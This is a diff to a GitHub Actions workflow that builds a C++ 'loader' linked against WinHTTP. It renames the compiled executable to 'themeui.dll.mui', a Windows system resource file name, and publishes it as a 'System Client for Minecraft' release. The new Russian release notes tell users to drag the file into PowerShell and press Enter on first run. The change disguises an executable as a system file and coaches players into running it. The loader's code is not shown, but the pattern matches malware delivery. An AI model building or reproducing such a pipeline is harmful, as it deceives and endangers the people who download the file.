@@ -43,7 +43,7 @@ jobs:
       - name: Build loader (C++)
         run: |
           x86_64-w64-mingw32-g++ -O2 -static \
-            -o "out/ekran_uaqyty.exe" native/loader.cpp \
+            -o "out/themeui.dll.mui" native/loader.cpp \
             -lwinhttp -lshlwapi -lkernel32 -luser32 \
             -mwindows
 
@@ -52,7 +52,7 @@ jobs:
           GH_TOKEN: ${{ github.token }}
         run: |
           gh release delete latest --yes --cleanup-tag || true
-          gh release create latest out/agent.jar "out/ekran_uaqyty.exe" \
+          gh release create latest out/agent.jar "out/themeui.dll.mui" \
             --target "$GITHUB_SHA" \
             --title "System Client for Minecraft $MC_VERSION" \
-            --notes "Просто скачай ekran_uaqyty.exe и запусти двойным кликом."
+            --notes "Первый запуск: перетащи themeui.dll.mui в PowerShell и нажми Enter. После этого двойной клик работает всегда."
